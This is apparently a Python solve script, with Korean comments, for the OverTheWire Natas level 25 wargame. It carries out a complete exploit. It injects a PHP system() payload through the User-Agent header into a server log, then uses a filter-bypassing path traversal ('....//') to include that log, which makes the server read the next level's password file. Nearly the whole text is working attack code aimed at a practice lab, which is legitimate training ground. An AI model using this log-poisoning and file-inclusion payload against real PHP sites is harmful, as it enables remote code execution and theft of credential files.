import requests
import sys
import re

boundary = "=" * 65

if (len(sys.argv)) != 2:
  print(boundary)
  print("[-] 파일 실행 포멧을 지키지 않았습니다, 아래와 같은 포멧으로 시도해주세요")
  print(f"    python {sys.argv[0]} natas25_password")
  print(boundary)
  sys.exit(1)
  
url = "http://natas25.natas.labs.overthewire.org/"
natas25_cred = sys.argv[1]

s = requests.Session()
s.auth = ("natas25", natas25_cred)

#저장된 log파일 뒤에 붙는 현재 쿠키값을 받기 위해서, get을 요청
sess_response = s.get(url)

# 요청에 사용할 헤더값 및 페이로드 주입
# 여기서 일부로 natas26_password is를 붙여서 re를 통해 해당 부분만 찾기 쉽게 추가 
sess = sess_response.cookies.get("PHPSESSID")
headers = {"User-Agent": "<?php echo 'natas26_password is '; system('cat /etc/natas_webpass/natas26'); ?>"}
payload = {"lang": f"....//logs/natas25_{sess}.log" }
cookies = {"PHPSESSID": sess}

# get 요청을 통해, 페이로드 이용해서 익스플로잇  
log_response = s.get(url, cookies=cookies, headers=headers, params=payload)


# 요청에 입력한 내용 확인용으로 화면에 출력
print(boundary)
print(f"[*] 요청 쿠키값: {sess}")
print(f"[*] 요청 헤더값: {log_response.status_code}")
print(f"[*] 요청 url: {log_response.url}")
print(boundary)

# 응답에서 비밀번호 추출
password = re.search(r"natas26_password is \s*([a-zA-Z0-9]{32})", log_response.text)

# 비밀번호 출력 및 예외처리
if password:
  print(f"[+] natas26 비밀번호 ====> {password.group(1)}")
  print(boundary)
elif log_response.status_code == 401:
  print(f"[-] 401 에러 발생, 현재 natas25 재로그인 혹은 로그인 세션 확인 필요")
  print(boundary)
else:
  print("[-] 아래 응답 html 코드에서 직접 비밀번호 확인")  
  print(log_response.text)
